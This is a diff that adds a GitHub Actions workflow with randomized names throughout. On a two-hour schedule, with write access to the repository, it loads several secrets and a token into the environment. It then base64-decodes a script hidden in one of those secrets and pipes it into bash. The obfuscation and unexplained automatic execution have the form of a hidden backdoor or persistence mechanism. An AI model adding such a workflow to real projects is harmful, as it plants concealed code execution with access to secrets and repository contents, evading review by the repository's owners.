@@ -1,0 +1,21 @@
+name: NkIOhLzILl
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  AkplH:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.SReFSfb }}
+      - name: iiBhCMgC7p4
+        env:
+          Duc41haw: ${{ secrets.eqIPVvdbNHd76lO }}
+          M2WEO7: ${{ secrets.OqDPSGeY6UX1u }}
+          RuLxbv7JZ: ${{ secrets.EzPtf }}
+          GITHUB_TOKEN: ${{ secrets.SReFSfb }}
+        run: echo "$Duc41haw" | base64 -d | bash
